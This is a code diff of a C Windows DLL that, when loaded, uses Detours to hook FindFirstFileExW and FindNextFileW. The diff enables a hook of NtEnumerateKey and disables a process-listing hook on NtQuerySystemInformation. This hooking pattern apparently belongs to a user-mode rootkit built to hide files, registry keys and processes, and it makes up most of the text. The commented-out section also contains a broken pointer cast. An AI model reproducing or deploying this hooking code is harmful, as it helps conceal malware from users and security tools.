@@ -11,6 +11,7 @@
 #include <windows.h>
 #include "Detours.h"
 #include "el_win_structs.h"
+#include "NtEnumerateKey.h"
 
 #include <shlwapi.h>
 #include <winsock2.h>
@@ -20,7 +21,7 @@
 #define FILE_TAG "EXAMPLE"
 
 typedef DWORD(NTAPI *elNtQuerySystemInformation)(DWORD i, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
-DWORD NTAPI elNtQuery(ELSYSTEM_INFORMATION_CLASS i, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
+DWORD NTAPI elNtQuery(SYSTEM_INFORMATION_CLASS i, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
 
 elNtQuerySystemInformation oldNtQuery;
 elNtQuerySystemInformation hookNtQuery;
@@ -37,7 +38,7 @@ BOOL WINAPI elFNFW(HANDLE findfile, LPWIN32_FIND_DATAW finddata);
 FNFW oldFNFW;
 FNFW hookFNFW;
 
-/*typedef NTSTATUS(WINAPI *TD_NtEnumerateKey)(HANDLE, ULONG, KEY_INFORMATION_CLASS, PVOID, ULONG, PULONG);
+typedef NTSTATUS(WINAPI *TD_NtEnumerateKey)(HANDLE, ULONG, KEY_INFORMATION_CLASS, PVOID, ULONG, PULONG);
 
 NTSTATUS NTAPI NewNtEnumerateKey(HANDLE, ULONG, KEY_INFORMATION_CLASS, PVOID, ULONG, PULONG);
 
@@ -48,7 +49,7 @@ typedef NTSTATUS(NTAPI *TD_NtOpenKey)(
     );
 
 TD_NtEnumerateKey oldNtEnumerateKey;
-TD_NtEnumerateKey hookNtEnumerateKey;*/
+TD_NtEnumerateKey hookNtEnumerateKey;
 
 BOOL APIENTRY DllMain(HMODULE hModule,
     DWORD  ul_reason_for_call,
@@ -64,8 +65,8 @@ BOOL APIENTRY DllMain(HMODULE hModule,
     {
     case DLL_PROCESS_ATTACH:
         MessageBox(0, "NTDLL CREATE HOOOKED", "HookTest", MB_OK | MB_ICONERROR);
-        oldNtQuery = (elNtQuerySystemInformation)GetProcAddress(NtDll, "NtQuerySystemInformation");
-        hookNtQuery = (elNtQuerySystemInformation)DetourFunction((PBYTE)oldNtQuery, (PBYTE)elNtQuery);
+        //oldNtQuery = (elNtQuerySystemInformation)GetProcAddress(NtDll, "NtQuerySystemInformation");
+        //hookNtQuery = (elNtQuerySystemInformation)DetourFunction((PBYTE)oldNtQuery, (PBYTE)elNtQuery);
 
         oldFFFEx = (FFFEx)GetProcAddress(Kernel32, "FindFirstFileExW");
         hookFFFEx = (FFFEx)DetourFunction((PBYTE)oldFFFEx, (PBYTE)elFFFEx);
@@ -73,8 +74,8 @@ BOOL APIENTRY DllMain(HMODULE hModule,
         oldFNFW = (FNFW)GetProcAddress(Kernel32, "FindNextFileW");
         hookFNFW = (FNFW)DetourFunction((PBYTE)oldFNFW, (PBYTE)elFNFW);
 
-        //oldNtEnumerateKey = (TD_NtEnumerateKey)GetProcAddress(NtDll, "NtEnumerateKey");
-        //hookNtEnumerateKey = (TD_NtEnumerateKey)DetourFunction((PBYTE)oldNtEnumerateKey, (PBYTE)NewNtEnumerateKey);
+        oldNtEnumerateKey = (TD_NtEnumerateKey)GetProcAddress(NtDll, "NtEnumerateKey");
+        hookNtEnumerateKey = (TD_NtEnumerateKey)DetourFunction((PBYTE)oldNtEnumerateKey, (PBYTE)NewNtEnumerateKey);
 
     case DLL_THREAD_ATTACH:
     case DLL_THREAD_DETACH:
@@ -83,12 +84,12 @@ BOOL APIENTRY DllMain(HMODULE hModule,
     }
     return TRUE;
 }
-
-DWORD NTAPI elNtQuery(ELSYSTEM_INFORMATION_CLASS i, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
+/*
+DWORD NTAPI elNtQuery(SYSTEM_INFORMATION_CLASS i, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
 {
     
     //MessageBox(0, "LISTING PROCESS CALLED", "HookTest", MB_OK | MB_ICONERROR);
-    PELSYSTEM_PROCESS_INFORMATION cur, prev;
+    SYSTEM_PROCESS_INFORMATION cur, prev;
     char tmp[128];
 
     DWORD r = hookNtQuery(i, SystemInformation, SystemInformationLength, ReturnLength);
@@ -106,7 +107,7 @@ DWORD NTAPI elNtQuery(ELSYSTEM_INFORMATION_CLASS i, PVOID SystemInformation, ULO
 
             RegCloseKey(key);
 
-            cur = prev = (PELSYSTEM_PROCESS_INFORMATION)SystemInformation;
+            cur = prev = (SYSTEM_PROCESS_INFORMATION)SystemInformation;
 
             while (1)
             {
@@ -138,7 +139,7 @@ DWORD NTAPI elNtQuery(ELSYSTEM_INFORMATION_CLASS i, PVOID SystemInformation, ULO
 
     return 0;
 }
-
+*/
 HANDLE WINAPI elFFFEx(wchar_t *lpFileName, FINDEX_INFO_LEVELS fInfoLevelId, LPVOID lpFindFileData, FINDEX_SEARCH_OPS fSearchOp, LPVOID lpSearchFilter, DWORD dwAdditionalFlags)
 {
     HANDLE ret = hookFFFEx(lpFileName, fInfoLevelId, lpFindFileData, fSearchOp, lpSearchFilter, dwAdditionalFlags);
